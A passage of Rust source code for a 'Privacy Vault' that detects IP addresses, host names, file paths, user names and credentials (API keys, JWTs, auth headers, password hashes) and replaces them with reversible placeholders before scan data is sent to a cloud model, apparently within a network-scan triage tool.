//! The Privacy Vault: a deterministic, two-way mapping between sensitive
//! values and placeholders, stored in `state.db`.
//!
//! Before anything is sent to a cloud API, IP addresses, internal host
//! names, filesystem paths, user names and secrets are replaced by
//! placeholders such as `<<HOST_01>>`, `<<DOM_01>>`, `<<PATH_01>>`,
//! `<<USER_01>>` and `<<SEC_01>>`. The same value always gets the same
//! placeholder, so the model can still reason about "the same host". The
//! reply is unmasked locally before it is shown or saved.
//!
//! Secrets (authorization headers, JWTs, credentials in URLs, Base64
//! `user:password` blobs, private keys, API keys, high-entropy strings) are
//! additionally flagged as exposed, so the report can list what to rotate.

use std::collections::{BTreeSet, HashMap};
use std::net::{IpAddr, Ipv6Addr};
use std::sync::{Arc, LazyLock, Mutex};

use anyhow::Result;
use regex::Regex;
use rusqlite::params;
use serde_json::Value;

use crate::db::Db;
use crate::graph::Graph;
use crate::timeutil::now_rfc3339;

/// Longest placeholder the stream unmasker will wait for.
const MAX_TOKEN_LEN: usize = 24;
const ENTROPY_MIN_LEN: usize = 20;
const ENTROPY_MIN_BITS: f64 = 3.6;
/// Sixteen symbols give at most 4 bits; random hexadecimal of 20 characters
/// or more is above this 99.7 % of the time.
const HEX_MIN_BITS: f64 = 2.8;
/// An MD5 or NTLM hash, and longer.
const HEX_KEY_LEN: usize = 32;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum Kind {
    Host,
    Dom,
    Path,
    User,
    Sec,
    /// Text that already looked like a placeholder before masking.
    Lit,
}

impl Kind {
    fn tag(self) -> &'static str {
        match self {
            Kind::Host => "HOST",
            Kind::Dom => "DOM",
            Kind::Path => "PATH",
            Kind::User => "USER",
            Kind::Sec => "SEC",
            Kind::Lit => "LIT",
        }
    }

    fn parse(tag: &str) -> Option<Self> {
        [
            Kind::Host,
            Kind::Dom,
            Kind::Path,
            Kind::User,
            Kind::Sec,
            Kind::Lit,
        ]
        .into_iter()
        .find(|kind| kind.tag() == tag)
    }
}

/// Names that are internal by construction.
const INTERNAL_TLDS: &[&str] = &[
    "local",
    "lan",
    "internal",
    "intranet",
    "intra",
    "corp",
    "home",
    "localdomain",
    "test",
    "example",
    "invalid",
    "htb",
    "thm",
    "lab",
];

/// Shared multi-label public suffixes (ccTLD second-level registries and
/// multi-tenant PaaS domains) that must never be registered as internal base
/// domains, or every unrelated public domain beneath them would be masked.
const PUBLIC_MULTI_LABEL_SUFFIXES: &[&str] = &[
    "eu.org",
    "uk.com",
    "us.com",
    "github.io",
    "gitlab.io",
    "pages.dev",
    "workers.dev",
    "vercel.app",
    "netlify.app",
    "herokuapp.com",
    "amazonaws.com",
    "cloudfront.net",
    "azurewebsites.net",
    "appspot.com",
    "run.app",
    "ondigitalocean.app",
    "fly.dev",
    "onrender.com",
];

pub(crate) fn is_public_multi_label_suffix(suffix: &str) -> bool {
    let lower = suffix.trim_matches('.').to_ascii_lowercase();
    if PUBLIC_MULTI_LABEL_SUFFIXES.contains(&lower.as_str()) {
        return true;
    }
    let parts: Vec<&str> = lower.split('.').collect();
    if parts.len() == 2 && parts[1].len() == 2 && parts[1].bytes().all(|b| b.is_ascii_alphabetic())
    {
        return matches!(
            parts[0],
            "co" | "com"
                | "net"
                | "org"
                | "gov"
                | "edu"
                | "ac"
                | "mil"
                | "or"
                | "ne"
                | "go"
                | "gob"
                | "nic"
                | "asn"
                | "id"
                | "ltd"
                | "plc"
                | "me"
        );
    }
    false
}

static TOKEN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"<<([A-Z]+)_(\d+)>>").expect("valid regex"));
static PRIVATE_KEY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?(?:-----END [A-Z ]*PRIVATE KEY-----|\z)")
        .expect("valid regex")
});
static AUTH_HEADER: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)\b(?:proxy-)?authorization\s*[:=]\s*(?:aws4-hmac-sha256\s+([^\r\n"']{8,})|(?:basic|bearer|digest|negotiate|ntlm|token|apikey|api-key|ssws|splunk|hmac|hawk|sharedkey|oauth|dpop|gnap|mac)\s+([A-Za-z0-9+/=._~:-]{4,}))"#)
        .expect("valid regex")
});
static COOKIE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?im)\b(?:set-)?cookie["']?\s*[:=]\s*["']?([^\r\n"']{4,})"#).expect("valid regex")
});
/// A name that holds a credential, alone or as one part of a longer name:
/// `password`, `DB_PASSWORD`, `aws_secret_access_key`, `reset-password-token`,
/// `PHPSESSID`. The name may be quoted; the value may be quoted too.
static KEY_VALUE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r#"(?i)(?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]+[_.-])*"#,
        r#"(?:x-api-key|(?:api|access|secret|private|auth|encryption|signing|master|license)[_-]?key"#,
        r#"|apikey|client[_-]?secret|secret|password|passwd|passphrase|pwd|pass"#,
        r#"|(?:access|refresh|auth|id|bearer|session|csrf|xsrf)[_-]?token|token|credentials?"#,
        r#"|[a-z]*sess(?:ion)?[_-]?id)"#,
        r#"(?:[_.-][A-Za-z0-9]+)*["']?\s*[:=]\s*"#,
        r#"(?:"([^"\r\n]{3,4096})"|'([^'\r\n]{3,4096})'|([^\s"',;&<>]{3,}))"#,
    ))
    .expect("valid regex")
});
/// The same in camelCase (`dbPassword`, `clientSecret`), which the pattern
/// above cannot see without taking `compass` and `tokens` for names.
static KEY_VALUE_CAMEL: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r#"[a-z0-9]+(?:Password|Passwd|Passphrase|Pwd|Secret|Token|ApiKey|Credentials?)"#,
        r#"[A-Za-z0-9]*["']?\s*[:=]\s*"#,
        r#"(?:"([^"\r\n]{3,4096})"|'([^'\r\n]{3,4096})'|([^\s"',;&<>]{3,}))"#,
    ))
    .expect("valid regex")
});
/// Query parameters that carry a credential under a short name.
static URL_SECRET: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)[?&;](?:key|sig|signature|code|auth|authkey)=([^&\s#"'<>]{3,})"#)
        .expect("valid regex")
});
/// Password hashes in the `$id$salt$hash` form (crypt, bcrypt, Argon2).
static CRYPT_HASH: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\$(?:1|2[abxy]?|5|6|y|apr1|argon2(?:id|i|d)?|pbkdf2[a-z0-9-]*)\$[^\s:]{8,}")
        .expect("valid regex")
});
/// A UUID: session ids and API keys are often one.
static UUID: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b")
        .expect("valid regex")
});
static URL_CREDENTIALS: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"://([^/\s:@]{1,64}):([^/\s@]{1,128})@").expect("valid regex"));
static JWT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\beyJ[A-Za-z0-9_-]{5,}\.eyJ[A-Za-z0-9_-]{5,}(?:\.[A-Za-z0-9_-]*)?")
        .expect("valid regex")
});
static KNOWN_KEY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"\b(?:AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|sk-ant-[A-Za-z0-9_-]{10,}|sk-or-v1-[A-Za-z0-9_-]{16,}|sk-proj-[A-Za-z0-9_-]{16,}|sk-[A-Za-z0-9]{20,}|gh[pousr]_[A-Za-z0-9_]{20,}|github_pat_[A-Za-z0-9_]{20,}|glpat-[A-Za-z0-9_-]{20,}|xox[baprs]-[A-Za-z0-9-]{10,}|(?:sk|pk|rk)_(?:live|test)_[A-Za-z0-9]{16,}|AIza[0-9A-Za-z_-]{35}|ssh-(?:rsa|ed25519|dss) [A-Za-z0-9+/=]{40,})",
    )
    .expect("valid regex")
});
/// `=` only as padding at the end: in `jwt=eyJ...` the name is not part of
/// the value.
static BLOB: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z0-9+/_-]{16,}={0,2}").expect("valid regex"));
static IPV4: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b(?:\d{1,3}\.){3}\d{1,3}\b").expect("valid regex"));
/// A run of the characters an IPv6 address is written with. The address in
/// it is found by parsing, not by this pattern: see [`ipv6_span`].
static IPV6_RUN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)[0-9a-f:.]*:[0-9a-f:.]*:[0-9a-f:.]*(?:%[\w.-]+)?").expect("valid regex")
});
static MAC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)\b(?:(?:[0-9a-f]{2}[:-]){5}[0-9a-f]{2}|[0-9a-f]{4}\.[0-9a-f]{4}\.[0-9a-f]{4})\b",
    )
    .expect("valid regex")
});
static HOSTNAME: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b[a-z0-9_](?:[a-z0-9_-]*[a-z0-9])?(?:\.[a-z0-9_](?:[a-z0-9_-]*[a-z0-9])?)+\b")
        .expect("valid regex")
});
static EMAIL_USER: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b([a-z0-9][a-z0-9._+-]{0,63})@(?:[a-z0-9-]+\.)+[a-z]{2,}\b")
        .expect("valid regex")
});
static FS_PATH: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r#"(?:/(?:home|Users|root|var|etc|opt|srv|mnt|data|tmp|usr/local|Volumes|media|private|Library|run|proc)"#,
        r#"(?:/[^\s"'<>:;,|]+)+"#,
        r#"|~/[^\s"'<>:;,|]+"#,
        r#"|\\\\[A-Za-z0-9._$-]+\\[^\s"'<>:;,|]+"#,
        r#"|\b[A-Za-z]:\\(?:[^\s"'<>:;,|\\]+\\)*[^\s"'<>:;,|\\]+"#,
        r#"|\b[A-Za-z]:/(?:[^\s"'<>:;,|/]+/)+[^\s"'<>:;,|/]+)"#,
    ))
    .expect("valid regex")
});
/// Fields in which a scanner reports what a machine or its domain is called
/// (`smb-os-discovery`, `rdp-ntlm-info`, `nbstat`): the value is a name even
/// when it is one word.
static NAMED_HOST: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r"(?i)\b(?:NetBIOS[_ ](?:Domain|Computer)[_ ]Name|Computer name|Domain name|Forest name",
        r"|FQDN|DNS[_ ](?:Domain|Computer|Tree)[_ ]Name|Target[_ ]Name|Workgroup|Server name)",
        r"\s*[:=]\s*([A-Za-z0-9][A-Za-z0-9._-]{1,253})",
    ))
    .expect("valid regex")
});
/// A login name given as such: `user=svc_backup`, `Login: jsmith`,
/// `logged in as CORP\jsmith`.
static NAMED_USER: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r#"(?i)(?:(?:^|[^A-Za-z0-9])(?:user(?:[_-]?name)?|login|logon|account|owner)["']?\s*[:=]\s*["']?"#,
        r#"|\b(?:logged (?:in|on) as|authenticated as|running as|as user)\s+["']?)"#,
        r#"([A-Za-z0-9][A-Za-z0-9._@\\$-]{1,63})"#,
    ))
    .expect("valid regex")
});

/// Login names every system has: they tell nothing about the target.
const COMMON_USERS: &[&str] = &[
    "root",
    "admin",
    "administrator",
    "guest",
    "nobody",
    "anonymous",
    "system",
    "user",
    "test",
    "www-data",
    "daemon",
    "none",
    "null",
    "true",
    "false",
    "yes",
    "no",
    "unknown",
];

/// Top-level domains under which a name is taken for a real host name and
/// masked: the generic ones and the country codes. Not the whole registry:
/// a name under a rarer ending is masked once the graph knows it.
const PUBLIC_TLDS: &[&str] = &[
    "com",
    "net",
    "org",
    "edu",
    "gov",
    "mil",
    "int",
    "info",
    "biz",
    "name",
    "pro",
    "mobi",
    "asia",
    "aero",
    "coop",
    "museum",
    "jobs",
    "travel",
    "dev",
    "app",
    "cloud",
    "online",
    "site",
    "tech",
    "xyz",
    "top",
    "club",
    "shop",
    "store",
    "blog",
    "live",
    "news",
    "agency",
    "digital",
    "email",
    "group",
    "network",
    "solutions",
    "systems",
    "services",
    "world",
    "company",
    "center",
    "media",
    "global",
    "consulting",
    "technology",
    "software",
    "security",
    "host",
    "hosting",
    "website",
    "space",
    "link",
    "work",
    "tools",
    "zone",
    "ltd",
    "inc",
    "llc",
    "gmbh",
    "bank",
    "finance",
    "health",
    "team",
    "wiki",
    "law",
    "io",
    "ai",
    "co",
    "tv",
    "me",
    "eu",
    "uk",
    "us",
    "de",
    "fr",
    "nl",
    "be",
    "ch",
    "at",
    "it",
    "es",
    "pt",
    "se",
    "no",
    "fi",
    "dk",
    "ie",
    "pl",
    "cz",
    "sk",
    "hu",
    "ro",
    "bg",
    "gr",
    "tr",
    "ru",
    "ua",
    "by",
    "kz",
    "lt",
    "lv",
    "ee",
    "is",
    "lu",
    "li",
    "si",
    "hr",
    "rs",
    "ba",
    "mk",
    "al",
    "md",
    "cy",
    "mt",
    "il",
    "sa",
    "ae",
    "qa",
    "kw",
    "bh",
    "om",
    "jo",
    "lb",
    "eg",
    "ma",
    "dz",
    "tn",
    "ng",
    "ke",
    "za",
    "gh",
    "tz",
    "ug",
    "et",
    "in",
    "pk",
    "bd",
    "lk",
    "np",
    "cn",
    "hk",
    "tw",
    "jp",
    "kr",
    "sg",
    "my",
    "th",
    "vn",
    "ph",
    "id",
    "au",
    "nz",
    "ca",
    "mx",
    "br",
    "ar",
    "cl",
    "pe",
    "ve",
    "uy",
    "ec",
    "bo",
    "py",
    "cr",
    "pa",
    "do",
    "cu",
    "to",
    "tk",
    "ml",
    "ws",
    "cc",
    "sh",
    "so",
    "st",
    "ps",
    "pm",
    "cf",
    "sc",
    "la",
    "ly",
    "gg",
    "im",
    "je",
    "ac",
    "fm",
    "am",
];
/// Country codes that are far more often a file ending than a domain: a
/// two-part name under one of them (`install.sh`, `README.md`) is a file.
const FILE_LIKE_TLDS: &[&str] = &[
    "py", "sh", "md", "rs", "so", "ps", "pm", "do", "cf", "mk", "sc", "cc",
];
/// Sites of software makers and advisory databases, and product names that
/// look like host names. They tell the model what software this is.
const PUBLIC_NAMES: &[&str] = &[
    "nist.gov",
    "mitre.org",
    "cve.org",
    "cisa.gov",
    "first.org",
    "osv.dev",
    "github.com",
    "gitlab.com",
    "exploit-db.com",
    "owasp.org",
    "nmap.org",
    "wikipedia.org",
    "w3.org",
    "ietf.org",
    "nginx.org",
    "nginx.com",
    "apache.org",
    "openssl.org",
    "openssh.com",
    "openbsd.org",
    "php.net",
    "python.org",
    "mozilla.org",
    "microsoft.com",
    "debian.org",
    "ubuntu.com",
    "redhat.com",
    "kernel.org",
    "wordpress.org",
    "jquery.com",
    "letsencrypt.org",
    "digicert.com",
    "npmjs.com",
    "pypi.org",
    "oracle.com",
    "mysql.com",
    "postgresql.org",
    "mariadb.org",
    "mongodb.com",
    "redis.io",
    "docker.com",
    "kubernetes.io",
    "vmware.com",
    "cisco.com",
    "fortinet.com",
    "f5.com",
    "citrix.com",
    "atlassian.com",
    "jenkins.io",
    "elastic.co",
    "grafana.com",
    "drupal.org",
    "joomla.org",
    "isc.org",
    "samba.org",
    "exim.org",
    "postfix.org",
    "dovecot.org",
    "haproxy.org",
    "gnu.org",
    "asp.net",
    "ado.net",
    "vb.net",
    "socket.io",
    "web.py",
];
/// Words of the request itself and of every scan. A certificate that names
/// itself `port` or `nginx` does not get that word masked everywhere.
const PLAIN_WORDS: &[&str] = &[
    "task",
    "triage",
    "research",
    "address",
    "hostnames",
    "ports",
    "port",
    "state",
    "service",
    "product",
    "version",
    "cpes",
    "paths",
    "claim",
    "source",
    "confidence",
    "title",
    "severity",
    "status",
    "open",
    "closed",
    "filtered",
    "tcp",
    "udp",
    "sctp",
    "http",
    "https",
    "ssl",
    "tls",
    "ssh",
    "ftp",
    "smtp",
    "dns",
    "smb",
    "rdp",
    "high",
    "medium",
    "low",
    "critical",
    "true",
    "false",
    "null",
    "none",
    "unknown",
    "nginx",
    "apache",
    "server",
    "client",
    "host",
    "name",
    "localhost",
    "www",
    "mail",
    "admin",
    "test",
    "the",
    "and",
    "for",
    "not",
];

/// The IPv6 address in the run `text[from..to]` (hexadecimal digits, colons
/// and dots with at least two colons), as a span of `text`. The run may hold
/// more than the address: the `c:` of `src:2001:db8::1`, a colon from
/// `addr:fe80::1`, an unbracketed `:port` (`fe80::1:65535`,
/// `2001:db8:1:2:3:4:5:6:8080`, or a registered host + `:8080`), or a full
/// stop that ends the sentence. An address is not taken out of the middle of
/// a word (`std::net`).
fn ipv6_span(
    text: &str,
    from: usize,
    to: usize,
    known_tokens: &HashMap<(Kind, String), String>,
) -> Option<(usize, usize)> {
    let run = &text[from..to];
    let (body, zone) = match run.find('%') {
        Some(at) => (&run[..at], &run[at..]),
        None => (run, ""),
    };
    let zone_trimmed = zone.trim_end_matches('.');
    let in_word = |c: Option<char>| c.is_some_and(|c| c.is_ascii_alphanumeric() || c == '_');
    let split_port = |candidate: &str| -> Option<(usize, Ipv6Addr)> {
        let (prefix, port) = candidate.rsplit_once(':')?;
        if port.is_empty() || !port.bytes().all(|b| b.is_ascii_digit()) {
            return None;
        }
        let p: u16 = port.parse().ok()?;
        if p == 0 {
            return None;
        }
        let ip = prefix.parse::<Ipv6Addr>().ok()?;
        Some((prefix.len(), ip))
    };
    let trimmed = body.trim_end_matches('.');
    let mut starts = vec![0];
    if let Some(colon) = trimmed.find(':') {
        if !trimmed[colon..].starts_with("::") {
            starts.push(colon + 1);
        }
    }
    let mut ends = vec![trimmed.len()];
    if trimmed.ends_with(':') && !trimmed.ends_with("::") {
        ends.push(trimmed.len() - 1);
    }
    for &start in &starts {
        for &end in &ends {
            let whole = end == body.len();
            if start >= end
                || (start == 0 && in_word(text[..from].chars().next_back()))
                || (whole && zone.is_empty() && in_word(text[to..].chars().next()))
            {
                continue;
            }
            let candidate = &trimmed[start..end];
            if zone.is_empty() {
                if let Some((prefix_len, ip)) = split_port(candidate) {
                    let canonical = IpAddr::V6(ip).to_canonical().to_string();
                    if known_tokens.contains_key(&(Kind::Host, canonical)) {
                        return Some((from + start, from + start + prefix_len));
                    }
                }
            }
            if candidate.parse::<Ipv6Addr>().is_ok() {
                let end = if whole { end + zone_trimmed.len() } else { end };
                return Some((from + start, from + end));
            }
            if zone.is_empty() {
                if let Some((prefix_len, _)) = split_port(candidate) {
                    return Some((from + start, from + start + prefix_len));
                }
            }
        }
    }
    None
}

/// Four numbers of at most 255 with dots between: also `010.001.000.007`,
/// which the standard parser refuses.
fn is_dotted_quad(text: &str) -> bool {
    text.split('.').count() == 4 && text.split('.').all(|part| part.parse::<u8>().is_ok())
}

/// Shannon entropy in bits per character.
fn entropy(text: &str) -> f64 {
    let mut counts = [0usize; 256];
    for byte in text.bytes() {
        counts[byte as usize] += 1;
    }
    let len = text.len() as f64;
    counts
        .iter()
        .filter(|count| **count > 0)
        .map(|count| {
            let p = *count as f64 / len;
            -p * p.log2()
        })
        .sum()
}

/// Decodes standard or URL-safe Base64; `None` if it is not Base64.
fn base64_decode(text: &str) -> Option<Vec<u8>> {
    let text = text.trim_end_matches('=');
    if text.len() < 4 || text.len() % 4 == 1 {
        return None;
    }
    let mut out = Vec::with_capacity(text.len() * 3 / 4);
    let (mut buffer, mut bits) = (0u32, 0u8);
    for byte in text.bytes() {
        let value = match byte {
            b'A'..=b'Z' => byte - b'A',
            b'a'..=b'z' => byte - b'a' + 26,
            b'0'..=b'9' => byte - b'0' + 52,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            _ => return None,
        };
        buffer = (buffer << 6) | u32::from(value);
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buffer >> bits) as u8);
            buffer &= (1 << bits) - 1;
        }
    }
    Some(out)
}

/// A Base64 blob that decodes to printable `user:password`.
fn is_base64_credentials(blob: &str) -> bool {
    base64_decode(blob)
        .and_then(|bytes| String::from_utf8(bytes).ok())
        .is_some_and(|text| {
            text.len() >= 3
                && text.chars().all(|c| c.is_ascii_graphic() || c == ' ')
                && text
                    .split_once(':')
                    .is_some_and(|(user, pass)| !user.is_empty() && !pass.is_empty())
        })
}

/// A word as people write them: digits, lower case, upper case or
/// CamelCase with short acronyms, possibly numbered (`Report2023`).
fn is_wordlike(word: &str) -> bool {
    let letters = word.trim_end_matches(|c: char| c.is_ascii_digit());
    if letters.bytes().any(|b| b.is_ascii_digit()) {
        return false;
    }
    if letters.bytes().all(|b| b.is_ascii_lowercase())
        || letters.bytes().all(|b| b.is_ascii_uppercase())
    {
        return true;
    }
    // camelCase: a first part of at least two small letters (or none), then
    // capital runs of at most four letters, each followed by small letters;
    // the last capital run may end the word (`TagNameNS`).
    let bytes = letters.as_bytes();
    let mut at = bytes.iter().take_while(|b| b.is_ascii_lowercase()).count();
    if at == 1 {
        return false;
    }
    while at < bytes.len() {
        let capitals = bytes[at..]
            .iter()
            .take_while(|b| b.is_ascii_uppercase())
            .count();
        at += capitals;
        let lower = bytes[at..]
            .iter()
            .take_while(|b| b.is_ascii_lowercase())
            .count();
        if capitals == 0 || capitals > 4 || (lower == 0 && at < bytes.len()) {
            return false;
        }
        at += lower;
    }
    true
}

/// A Base64-looking blob that is cut into short runs by `/`, `+`, `-` or
/// `_` (an AWS secret key, a URL-safe token): mixed case, and most of it
/// is not made of words. Paths and dashed names are made of words.
fn is_scrambled(blob: &str) -> bool {
    if blob.len() < ENTROPY_MIN_LEN
        || !blob.bytes().any(|b| b.is_ascii_uppercase())
        || !blob.bytes().any(|b| b.is_ascii_lowercase())
    {
        return false;
    }
    let (mut total, mut odd) = (0, 0);
    for word in blob.split(|c: char| !c.is_ascii_alphanumeric()) {
        total += word.len();
        if !is_wordlike(word) {
            odd += word.len();
        }
    }
    total >= ENTROPY_MIN_LEN && odd * 10 >= total * 6
}

/// A random-looking token: some unbroken run of letters and digits is long
/// and varied. Splitting on punctuation first keeps URL paths, package
/// names and dashed identifiers (`detail/CVE-2021-23017`) from qualifying.
/// Hexadecimal has fewer symbols, so a hash or key written in it counts
/// from a lower variety; a blob cut up by `/` or `+` is judged as a whole.
fn is_high_entropy(blob: &str) -> bool {
    blob.split(|c: char| !c.is_ascii_alphanumeric()).any(|run| {
        let hex = run.bytes().all(|b| b.is_ascii_hexdigit());
        let mixed =
            run.bytes().any(|b| b.is_ascii_digit()) && run.bytes().any(|b| b.is_ascii_alphabetic());
        if hex {
            (run.len() >= HEX_KEY_LEN && entropy(run) >= HEX_MIN_BITS)
                || (run.len() >= ENTROPY_MIN_LEN && mixed && entropy(run) >= HEX_MIN_BITS)
        } else {
            run.len() >= ENTROPY_MIN_LEN && mixed && entropy(run) >= ENTROPY_MIN_BITS
        }
    }) || is_scrambled(blob)
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExposedSecret {
    pub token: String,
    /// A redacted hint (`eyJh... (148 chars)`), never the secret itself.
    pub preview: String,
    pub first_seen_utc: String,
}

#[derive(Debug, Clone)]
struct Entry {
    kind: Kind,
    value: String,
    first_seen_utc: String,
}

#[derive(Default)]
pub struct Vault {
    /// token -> entry
    entries: HashMap<String, Entry>,
    /// (kind, value) -> token
    tokens: HashMap<(Kind, String), String>,
    counters: HashMap<Kind, u32>,
    /// Internal base domains: every name under one of them is masked.
    suffixes: BTreeSet<String>,
    /// Registered names and user names by their first word, in lower case,
    /// so that finding them in a text does not mean trying each one.
    by_first_word: HashMap<String, Vec<(Kind, String)>>,
    store: Option<Arc<Mutex<Db>>>,
}

/// The first run of letters, digits and `_` in `value`, in lower case.
fn first_word(value: &str) -> String {
    value
        .chars()
        .skip_while(|c| !(c.is_ascii_alphanumeric() || *c == '_'))
        .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
        .collect::<String>()
        .to_ascii_lowercase()
}

/// One label of a host name that is worth masking: letters, digits and
/// hyphens, and not one of [`PLAIN_WORDS`].
fn is_single_label_name(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    (2..=63).contains(&name.len())
        && name
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
        && !name.starts_with('-')
        && !name.ends_with('-')
        && !PLAIN_WORDS.contains(&lower.as_str())
}

fn extract_redirect_host(location: &str) -> Option<String> {
    let trimmed = location.trim();
    let candidate = if let Some(rest) = trimmed.strip_prefix("//") {
        format!("https://{rest}")
    } else {
        trimmed.to_owned()
    };
    let parsed = url::Url::parse(&candidate).ok()?;
    if !matches!(parsed.scheme(), "http" | "https") {
        return None;
    }
    match parsed.host()? {
        url::Host::Domain(name) => Some(name.to_owned()),
        url::Host::Ipv4(ip) => Some(ip.to_string()),
        url::Host::Ipv6(ip) => Some(ip.to_string()),
    }
}

fn preview(value: &str) -> String {
    let head: String = value.chars().take(4).collect();
    format!("{head}... ({} chars)", value.chars().count())
}

impl Vault {
    /// A vault that lives only in memory (tests, dry runs).
    pub fn ephemeral() -> Self {
        Self::default()
    }

    /// Loads the vault of a workspace; new placeholders are written through.
    pub fn open(db: Arc<Mutex<Db>>) -> Result<Self> {
        const MAX_NON_EXPOSED_ROWS: i64 = 10_000;
        let mut vault = Self::default();
        {
            let guard = db.lock().unwrap_or_else(|p| p.into_inner());
            let _ = guard.conn().execute(
                "DELETE FROM vault WHERE exposed = 0 AND token NOT IN (
                     SELECT token FROM vault WHERE exposed = 0
                     ORDER BY first_seen_utc DESC, token DESC LIMIT ?1
                 )",
                params![MAX_NON_EXPOSED_ROWS],
            );
            let mut statement = guard.conn().prepare(
                "SELECT token, kind, value, first_seen_utc FROM vault
                 ORDER BY exposed DESC, first_seen_utc DESC, token DESC LIMIT 12000",
            )?;
            let rows = statement.query_map([], |row| {
                Ok((
                    row.get::<_, String>(0)?,
                    row.get::<_, String>(1)?,
                    row.get::<_, String>(2)?,
                    row.get::<_, String>(3)?,
                ))
            })?;
            for row in rows {
                let (token, kind, value, first_seen_utc) = row?;
                let Some(kind) = Kind::parse(&kind) else {
                    continue;
                };
                if let Some(index) = TOKEN
                    .captures(&token)
                    .and_then(|c| c[2].parse::<u32>().ok())
                {
                    let counter = vault.counters.entry(kind).or_default();
                    *counter = (*counter).max(index);
                }
                vault.index(kind, &value);
                vault.tokens.insert((kind, value.clone()), token.clone());
                vault.entries.insert(
                    token,
                    Entry {
                        kind,
                        value,
                        first_seen_utc,
                    },
                );
            }
        }
        vault.store = Some(db);
        Ok(vault)
    }

    /// The placeholder for `value`, created on first use.
    pub fn register(&mut self, kind: Kind, value: &str) -> String {
        let value = match kind {
            Kind::Dom => value.trim_end_matches('.').to_ascii_lowercase(),
            Kind::Host => {
                let bare = value.split('%').next().unwrap_or(value);
                match bare.parse::<IpAddr>() {
                    Ok(ip) => ip.to_canonical().to_string(),
                    Err(_) => value.to_ascii_lowercase(),
                }
            }
            _ => value.to_owned(),
        };
        if let Some(token) = self.tokens.get(&(kind, value.clone())) {
            return token.clone();
        }
        let counter = self.counters.entry(kind).or_default();
        *counter += 1;
        let current_count = *counter;
        let token = format!("<<{}_{:02}>>", kind.tag(), current_count);
        let entry = Entry {
            kind,
            value: value.clone(),
            first_seen_utc: now_rfc3339(),
        };
        if let Some(db) = &self.store {
            let guard = db.lock().unwrap_or_else(|p| p.into_inner());
            let _ = guard.conn().execute(
                "INSERT OR IGNORE INTO vault (token, kind, value, exposed, first_seen_utc)
                 VALUES (?1, ?2, ?3, ?4, ?5)",
                params![
                    token,
                    kind.tag(),
                    value,
                    kind == Kind::Sec,
                    entry.first_seen_utc
                ],
            );
            if kind != Kind::Sec && current_count.is_multiple_of(512) {
                let _ = guard.conn().execute(
                    "DELETE FROM vault WHERE exposed = 0 AND token NOT IN (
                         SELECT token FROM vault WHERE exposed = 0
                         ORDER BY first_seen_utc DESC, token DESC LIMIT 10000
                     )",
                    [],
                );
            }
        }
        self.index(kind, &value);
        self.tokens.insert((kind, value), token.clone());
        self.entries.insert(token.clone(), entry);
        token
    }

    fn index(&mut self, kind: Kind, value: &str) {
        let min_len = match kind {
            Kind::Dom => 2,
            Kind::User => 3,
            _ => return,
        };
        if value.len() >= min_len {
            let word = first_word(value);
            if !word.is_empty() {
                let pair = (kind, value.to_ascii_lowercase());
                let list = self.by_first_word.entry(word).or_default();
                if !list.contains(&pair) {
                    list.push(pair);
                }
            }
        }
    }

    /// Marks a base domain as internal: it and every name below it are masked.
    pub fn register_domain_suffix(&mut self, suffix: &str) {
        let suffix = suffix
            .trim_start_matches("*.")
            .trim_matches('.')
            .to_ascii_lowercase();
        if is_public_multi_label_suffix(&suffix) {
            return;
        }
        if suffix.contains('.') || INTERNAL_TLDS.contains(&suffix.as_str()) {
            self.suffixes.insert(suffix);
        }
    }

    /// Registers everything the graph knows to be private: host addresses,
    /// names, TLS SANs, redirect hosts, local interface addresses, gateways
    /// and neighbours.
    pub fn register_graph(&mut self, graph: &Graph) {
        let domain = |vault: &mut Self, name: &str| {
            let name = name.trim_start_matches("*.");
            if name.parse::<IpAddr>().is_ok() || !name.contains('.') {
                // One word: a machine name, unless it is a word every scan
                // and every request holds (a certificate can name anything).
                if name.parse::<IpAddr>().is_err() && is_single_label_name(name) {
                    vault.register(Kind::Dom, name);
                }
                return;
            }
            vault.register(Kind::Dom, name);
            // app.lab.local -> every *.lab.local name is internal too.
            // corp.co.uk -> parent is public suffix co.uk, so corp.co.uk itself is the root.
            let labels: Vec<&str> = name.split('.').collect();
            if labels.len() >= 3 {
                let parent = labels[1..].join(".");
                if is_public_multi_label_suffix(&parent) {
                    vault.register_domain_suffix(name);
                } else {
                    vault.register_domain_suffix(&parent);
                }
            } else if labels.len() == 2 {
                vault.register_domain_suffix(name);
            }
        };
        for host in graph.hosts.values() {
            match host
                .address
                .split('%')
                .next()
                .unwrap_or("")
